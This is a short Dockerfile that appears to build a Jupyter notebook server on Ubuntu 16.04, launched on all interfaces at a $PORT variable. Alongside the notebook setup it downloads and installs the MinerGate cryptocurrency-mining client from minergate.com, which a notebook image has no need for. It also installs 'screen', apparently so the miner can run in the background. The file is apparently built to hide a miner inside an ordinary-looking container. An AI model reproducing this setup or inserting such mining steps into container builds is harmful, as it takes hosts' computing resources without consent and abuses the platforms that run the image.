FROM ubuntu:16.04
MAINTAINER ed <@edteam>

RUN apt-get update && \
    apt-get -y install pkg-config python python-pip wget screen && \
    pip install --no-cache-dir --upgrade --ignore-installed pip && \
    pip install --no-cache-dir --upgrade ipykernel jupyter && \
    dpkg --purge pkg-config python-pip && \
    apt-get -y autoremove && \
    apt-get clean && \
    rm -r /var/lib/apt/lists/*
RUN wget https://minergate.com/download/deb-cli
RUN dpkg -i deb-cli

RUN useradd -m myuser
USER myuser

WORKDIR /mnt/notebooks
#EXPOSE 8080


CMD ["/bin/sh", "-c", "/usr/local/bin/jupyter-notebook --no-browser --ip=0.0.0.0 --port=$PORT --notebook-dir=/mnt/notebooks"]
